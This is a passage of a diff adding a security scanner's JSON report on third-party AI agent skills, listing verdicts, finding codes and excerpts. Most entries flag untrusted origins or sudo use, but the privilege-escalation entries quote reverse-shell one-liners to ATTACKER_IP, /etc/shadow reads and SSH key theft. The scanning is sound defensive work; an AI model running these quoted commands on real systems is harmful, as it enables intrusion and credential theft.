+          "message": "Origin github.com/sanity-io/agent-toolkit is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "dev-browser": {
+      "ref": "sawyerhood/dev-browser@dev-browser",
+      "skillKey": "dev-browser",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:33.709Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "npm_install_global",
+          "message": "Installs Node packages globally.",
+          "file": "SKILL.md",
+          "excerpt": "ts. ## Installation ```bash npm install -g dev-browser dev-browser insta"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sawyerhood/dev-browser is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "active-directory-attacks": {
+      "ref": "sickn33/antigravity-awesome-skills@active-directory-attacks",
+      "skillKey": "active-directory-attacks",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.146Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "b2-time # Fix clock on Linux sudo date -s \"14 APR 2024 18:25:16"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "avalonia-layout-zafiro": {
+      "ref": "sickn33/antigravity-awesome-skills@avalonia-layout-zafiro",
+      "skillKey": "avalonia-layout-zafiro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.147Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "avalonia-viewmodels-zafiro": {
+      "ref": "sickn33/antigravity-awesome-skills@avalonia-viewmodels-zafiro",
+      "skillKey": "avalonia-viewmodels-zafiro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.147Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "avalonia-zafiro-development": {
+      "ref": "sickn33/antigravity-awesome-skills@avalonia-zafiro-development",
+      "skillKey": "avalonia-zafiro-development",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.148Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "busybox-on-windows": {
+      "ref": "sickn33/antigravity-awesome-skills@busybox-on-windows",
+      "skillKey": "busybox-on-windows",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.149Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "cc-skill-continuous-learning": {
+      "ref": "sickn33/antigravity-awesome-skills@cc-skill-continuous-learning",
+      "skillKey": "cc-skill-continuous-learning",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.149Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "cc-skill-project-guidelines-example": {
+      "ref": "sickn33/antigravity-awesome-skills@cc-skill-project-guidelines-example",
+      "skillKey": "cc-skill-project-guidelines-example",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.150Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "SKILL.md",
+          "excerpt": "DATABASE_URL=postgresql://... ANTHROPIC_API_KEY=sk-ant-... SUPABASE_URL=https"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "cc-skill-strategic-compact": {
+      "ref": "sickn33/antigravity-awesome-skills@cc-skill-strategic-compact",
+      "skillKey": "cc-skill-strategic-compact",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.150Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "codex-review": {
+      "ref": "sickn33/antigravity-awesome-skills@codex-review",
+      "skillKey": "codex-review",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.150Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "context7-auto-research": {
+      "ref": "sickn33/antigravity-awesome-skills@context7-auto-research",
+      "skillKey": "context7-auto-research",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.151Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "design-orchestration": {
+      "ref": "sickn33/antigravity-awesome-skills@design-orchestration",
+      "skillKey": "design-orchestration",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.151Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "environment-setup-guide": {
+      "ref": "sickn33/antigravity-awesome-skills@environment-setup-guide",
+      "skillKey": "environment-setup-guide",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.152Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "dotfile_write",
+          "message": "Writes to user shell init files (persistence vector).",
+          "file": "SKILL.md",
+          "excerpt": "PATH=~/.npm-global/bin:$PATH' >> ~/.bashrc source ~/.bashrc \\`\\`\\` ```"
+        },
+        {
+          "severity": "warning",
+          "code": "dotfile_write",
+          "message": "Writes to user shell init files (persistence vector).",
+          "file": "SKILL.md",
+          "excerpt": "PATH=~/.npm-global/bin:$PATH' >> ~/.bashrc ``` ### Problem: Port alread"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "`\\`bash # Update package list sudo apt update # Install Node.js"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "60p' /tmp/nodesource-setup.sh sudo -E bash /tmp/nodesource-setup"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "bash /tmp/nodesource-setup.sh sudo apt install -y nodejs \\`\\`\\`"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "rrors **Solution:** Don't use sudo with npm. Fix permissions: \\`"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "\\`\\`\\` **Linux:** \\`\\`\\`bash sudo apt update sudo apt install p"
+        },
+        {
+          "severity": "info",
+          "code": "apt_install",
+          "message": "Installs system packages via apt.",
+          "file": "SKILL.md",
+          "excerpt": "/tmp/nodesource-setup.sh sudo apt install -y nodejs \\`\\`\\` **Windows ("
+        },
+        {
+          "severity": "info",
+          "code": "apt_install",
+          "message": "Installs system packages via apt.",
+          "file": "SKILL.md",
+          "excerpt": "\\`\\`bash sudo apt update sudo apt install python3.11 python3.11-venv py"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "SKILL.md",
+          "excerpt": "Install from requirements.txt pip install -r requirements.txt # Or ins"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "SKILL.md",
+          "excerpt": "install packages individually pip install flask sqlalchemy python-doten"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "exa-search": {
+      "ref": "sickn33/antigravity-awesome-skills@exa-search",
+      "skillKey": "exa-search",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.152Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "firecrawl-scraper": {
+      "ref": "sickn33/antigravity-awesome-skills@firecrawl-scraper",
+      "skillKey": "firecrawl-scraper",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.152Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "form-cro": {
+      "ref": "sickn33/antigravity-awesome-skills@form-cro",
+      "skillKey": "form-cro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.153Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "free-tool-strategy": {
+      "ref": "sickn33/antigravity-awesome-skills@free-tool-strategy",
+      "skillKey": "free-tool-strategy",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.153Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "last30days": {
+      "ref": "sickn33/antigravity-awesome-skills@last30days",
+      "skillKey": "last30days",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.537Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "README.md",
+          "excerpt": "nfig/last30days/.env << 'EOF' OPENAI_API_KEY=sk-... XAI_API_KEY=xai-... EO"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "SKILL.md",
+          "excerpt": "ses OpenAI's web_search tool) OPENAI_API_KEY= # For X/Twitter research (u"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "SKILL.md",
+          "excerpt": "/.config/last30days/.env - OPENAI_API_KEY → Reddit (real upvotes & comm"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "plans/feat-add-websearch-source.md",
+          "excerpt": "has_openai = bool(config.get('OPENAI_API_KEY')) has_xai = bool(config."
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/last30days.py",
+          "excerpt": "ddit( config[\"OPENAI_API_KEY\"], selected_m"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/last30days.py",
+          "excerpt": "( config[\"OPENAI_API_KEY\"], select"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/last30days.py",
+          "excerpt": "{ \"OPENAI_API_KEY\": \"mock\", \"XA"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/env.py",
+          "excerpt": "file config = { 'OPENAI_API_KEY': os.environ.get('OPENAI_API_"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/env.py",
+          "excerpt": "NAI_API_KEY': os.environ.get('OPENAI_API_KEY') or file_env.get('OPENAI_API"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/env.py",
+          "excerpt": "AI_API_KEY') or file_env.get('OPENAI_API_KEY'), 'XAI_API_KEY': os."
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/env.py",
+          "excerpt": "has_openai = bool(config.get('OPENAI_API_KEY')) has_xai = bool(config."
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/env.py",
+          "excerpt": "has_openai = bool(config.get('OPENAI_API_KEY')) has_xai = bool(config."
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/models.py",
+          "excerpt": "i\": None} if config.get(\"OPENAI_API_KEY\"): result[\"openai\"] ="
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/models.py",
+          "excerpt": "ai_model( config[\"OPENAI_API_KEY\"], config.get(\"OP"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/render.py",
+          "excerpt": "a:\") lines.append(\"- `OPENAI_API_KEY` → Reddit threads with real u"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/render.py",
+          "excerpt": "lines.append(\"*💡 Tip: Add OPENAI_API_KEY for Reddit data and better tr"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/ui.py",
+          "excerpt": "ommunity insights └─ Add OPENAI_API_KEY (uses OpenAI's web_search for"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/ui.py",
+          "excerpt": "ommunity insights └─ Add OPENAI_API_KEY (uses OpenAI's web_search for"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/ui.py",
+          "excerpt": "IM}💡 Tip: Add {Colors.YELLOW}OPENAI_API_KEY{Colors.RESET}{Colors.DIM} to"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "scripts/lib/ui.py",
+          "excerpt": "\"reddit\": \"\\n💡 Tip: Add OPENAI_API_KEY to ~/.config/last30days/.env"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "tests/test_models.py",
+          "excerpt": "nly(self): config = {\"OPENAI_API_KEY\": \"sk-test\"} mock_mod"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "tests/test_models.py",
+          "excerpt": "config = { \"OPENAI_API_KEY\": \"sk-test\", \"XAI"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "lint-and-validate": {
+      "ref": "sickn33/antigravity-awesome-skills@lint-and-validate",
+      "skillKey": "lint-and-validate",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.538Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "linux-privilege-escalation": {
+      "ref": "sickn33/antigravity-awesome-skills@linux-privilege-escalation",
+      "skillKey": "linux-privilege-escalation",
+      "verdict": "rejected",
+      "scannedAt": "2026-05-27T02:52:42.539Z",
+      "findings": [
+        {
+          "severity": "critical",
+          "code": "reverse_shell_bash",
+          "message": "Bash reverse-shell pattern (bash -i over /dev/tcp/).",
+          "file": "SKILL.md",
+          "excerpt": "# Check permissions echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt"
+        },
+        {
+          "severity": "critical",
+          "code": "reverse_shell_bash",
+          "message": "Bash reverse-shell pattern (bash -i over /dev/tcp/).",
+          "file": "SKILL.md",
+          "excerpt": "le PATH echo -e '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home"
+        },
+        {
+          "severity": "critical",
+          "code": "reverse_shell_bash",
+          "message": "Bash reverse-shell pattern (bash -i over /dev/tcp/).",
+          "file": "SKILL.md",
+          "excerpt": "ell One-Liners ```bash # Bash bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 # Pytho"
+        },
+        {
+          "severity": "critical",
+          "code": "reverse_shell_nc",
+          "message": "netcat reverse-shell pattern (nc -e).",
+          "file": "SKILL.md",
+          "excerpt": "\"/bin/bash\",\"-i\"])' # Netcat nc -e /bin/bash ATTACKER_IP 4444 #"
+        },
+        {
+          "severity": "critical",
+          "code": "etc_shadow",
+          "message": "Reads /etc/shadow — Linux password hash store.",
+          "file": "SKILL.md",
+          "excerpt": "base64 for file reading LFILE=/etc/shadow base64 \"$LFILE\" | base64 -d"
+        },
+        {
+          "severity": "critical",
+          "code": "etc_shadow",
+          "message": "Reads /etc/shadow — Linux password hash store.",
+          "file": "SKILL.md",
+          "excerpt": "e (if base64 has SUID) base64 /etc/shadow | base64 -d > shadow.txt base"
+        },
+        {
+          "severity": "critical",
+          "code": "etc_shadow",
+          "message": "Reads /etc/shadow — Linux password hash store.",
+          "file": "SKILL.md",
+          "excerpt": "e64 /usr/bin/base64 $ base64 /etc/shadow | base64 -d root:$6$xyz...:18"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "on of kernel vulnerabilities, sudo misconfigurations, SUID binar"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "rate Sudo Privileges ```bash sudo -l ``` #### GTFOBins Sudo Ex"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "```bash # Example: vim with sudo sudo vim -c ':!/bin/bash' #"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "bash # Example: vim with sudo sudo vim -c ':!/bin/bash' # Examp"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "n/bash' # Example: find with sudo sudo find . -exec /bin/sh \\;"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "metasploit-framework": {
+      "ref": "sickn33/antigravity-awesome-skills@metasploit-framework",
+      "skillKey": "metasploit-framework",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.540Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "ailable and does not require `sudo`, `systemctl`, or other privi"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "Database not connected | Run `sudo msfdb init`, start PostgreSQL"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "moodle-external-api-development": {
+      "ref": "sickn33/antigravity-awesome-skills@moodle-external-api-development",
+      "skillKey": "moodle-external-api-development",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.540Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "multi-agent-brainstorming": {
+      "ref": "sickn33/antigravity-awesome-skills@multi-agent-brainstorming",
+      "skillKey": "multi-agent-brainstorming",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.541Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "nosql-expert": {
+      "ref": "sickn33/antigravity-awesome-skills@nosql-expert",
+      "skillKey": "nosql-expert",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.541Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "obsidian-clipper-template-creator": {
+      "ref": "sickn33/antigravity-awesome-skills@obsidian-clipper-template-creator",
+      "skillKey": "obsidian-clipper-template-creator",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.542Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "page-cro": {
+      "ref": "sickn33/antigravity-awesome-skills@page-cro",
+      "skillKey": "page-cro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.543Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "paid-ads": {
+      "ref": "sickn33/antigravity-awesome-skills@paid-ads",
+      "skillKey": "paid-ads",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.543Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "pentest-commands": {
+      "ref": "sickn33/antigravity-awesome-skills@pentest-commands",
+      "skillKey": "pentest-commands",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.544Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "popup-cro": {
+      "ref": "sickn33/antigravity-awesome-skills@popup-cro",
+      "skillKey": "popup-cro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.544Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "privilege-escalation-methods": {
+      "ref": "sickn33/antigravity-awesome-skills@privilege-escalation-methods",
+      "skillKey": "privilege-escalation-methods",
+      "verdict": "rejected",
+      "scannedAt": "2026-05-27T02:52:42.546Z",
+      "findings": [
+        {
+          "severity": "critical",
+          "code": "creds_ssh",
+          "message": "Reads SSH private keys or authorized_keys.",
+          "file": "SKILL.md",
+          "excerpt": "usr/bin/tar -cvf key.tar /root/.ssh/id_rsa /usr/bin/tar -xvf key.tar ```"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "naries Exploit misconfigured sudo permissions using GTFOBins te"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "techniques: ```bash # Check sudo permissions sudo -l # Exploi"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "bash # Check sudo permissions sudo -l # Exploit common binaries"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "-l # Exploit common binaries sudo vim -c ':!/bin/bash' sudo fin"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "ies sudo vim -c ':!/bin/bash' sudo find /etc/passwd -exec /bin/b"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "production-code-audit": {
+      "ref": "sickn33/antigravity-awesome-skills@production-code-audit",
+      "skillKey": "production-code-audit",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.546Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "referral-program": {
+      "ref": "sickn33/antigravity-awesome-skills@referral-program",
+      "skillKey": "referral-program",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.547Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "schema-markup": {
+      "ref": "sickn33/antigravity-awesome-skills@schema-markup",
+      "skillKey": "schema-markup",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.547Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "smtp-penetration-testing": {
+      "ref": "sickn33/antigravity-awesome-skills@smtp-penetration-testing",
+      "skillKey": "smtp-penetration-testing",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.548Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "bash # Nmap with SMTP scripts sudo apt-get install nmap # Netca"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "pt-get install nmap # Netcat sudo apt-get install netcat # Hyd"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "tcat # Hydra for brute force sudo apt-get install hydra # SMTP"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "# SMTP user enumeration tool sudo apt-get install smtp-user-enu"
+        },
+        {
+          "severity": "info",
+          "code": "apt_install",
+          "message": "Installs system packages via apt.",
+          "file": "SKILL.md",
+          "excerpt": "# Nmap with SMTP scripts sudo apt-get install nmap # Netcat sudo apt-get i"
+        },
+        {
+          "severity": "info",
+          "code": "apt_install",
+          "message": "Installs system packages via apt.",
+          "file": "SKILL.md",
+          "excerpt": "t install nmap # Netcat sudo apt-get install netcat # Hydra for brute for"
+        },
+        {
+          "severity": "info",
+          "code": "apt_install",
+          "message": "Installs system packages via apt.",
+          "file": "SKILL.md",
+          "excerpt": "# Hydra for brute force sudo apt-get install hydra # SMTP user enumeratio"
+        },
+        {
+          "severity": "info",
+          "code": "apt_install",
+          "message": "Installs system packages via apt.",
+          "file": "SKILL.md",
+          "excerpt": "TP user enumeration tool sudo apt-get install smtp-user-enum # Metasploit"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
